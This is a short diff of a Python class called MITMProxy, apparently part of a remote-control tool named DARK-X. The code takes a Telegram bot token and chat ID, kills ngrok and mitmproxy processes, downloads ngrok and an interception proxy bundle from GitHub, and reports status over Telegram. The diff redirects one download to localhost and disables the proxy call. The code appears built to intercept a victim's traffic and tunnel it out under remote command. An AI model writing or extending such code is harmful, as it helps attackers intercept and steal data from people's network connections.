@@ -10,14 +10,14 @@ class MITMProxy():
 	def __init__(self):
 		self.token = sys.argv[1]
 		self.chat_id= sys.argv[2]
-		self.ngrok = "https://raw.githubusercontent.com/UQABXO/DARK-X/main/bin/ngrok-stable-windows-386.zip"
+		self.ngrok = "http://127.0.0.1/ngrok-stable-windows-386.zip"#https://raw.githubusercontent.com/UQABXO/DARK-X/main/bin/ngrok-stable-windows-386.zip"
 		self.mitmfproxy = "https://raw.githubusercontent.com/UQABXO/DARK-X/main/bin/mitmfproxy.zip"
 		self.Main()
 
 	def Main(self):
 		os.system('taskkill /IM ngrok.exe /F')
 		os.system('taskkill /IM mitmproxy.exe /F')
-		self.MITM_Proxy()
+		#self.MITM_Proxy()
 		self.Ngrok()
 	def Ngrok(self):
 		self.SendMessage(" Donwloading Ngrok...")
